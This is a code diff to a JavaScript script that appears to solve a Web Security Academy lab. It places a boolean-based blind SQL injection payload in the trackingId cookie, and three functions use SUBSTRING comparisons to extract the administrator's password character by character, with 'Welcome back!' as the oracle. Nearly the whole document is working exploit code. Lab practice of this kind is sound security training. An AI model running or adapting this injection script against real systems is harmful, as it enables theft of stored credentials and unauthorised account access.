@@ -69,9 +69,8 @@ async function run() {
       const response = await request({
         url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
         path: '/filter?category=Gifts',
-        trackingId: '12knXqNU7IoiLmNp',
+        trackingId: `12knXqNU7IoiLmNp' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${charAt}, 1) = '${char}`,
         session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
-        query: `' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${charAt}, 1) = '${char}`,
       });
 
       if (JSON.stringify(response.data).search('Welcome back!') > 1) {
@@ -116,9 +115,8 @@ async function run2() {
       const response = await request({
         url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
         path: '/filter?category=Gifts',
-        trackingId: '12knXqNU7IoiLmNp',
+        trackingId: `12knXqNU7IoiLmNp' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${charAt}, 1) > '${char}`,
         session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
-        query: `' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), ${charAt}, 1) > '${char}`,
       });
 
       if (JSON.stringify(response.data).search('Welcome back!') > 1) {
@@ -173,9 +171,8 @@ async function runIndividual() {
     const response = await request({
       url: 'https://0aff00ee0379674284bc0150005c00af.web-security-academy.net',
       path: '/filter?category=Gifts',
-      trackingId: '12knXqNU7IoiLmNp',
+      trackingId: `12knXqNU7IoiLmNp' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm`,
       session: 'S2MzetaWJ7xjCK4kVGLS47RWUrPoGbN1',
-      query: `' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm`,
     });
 
     console.log(response);
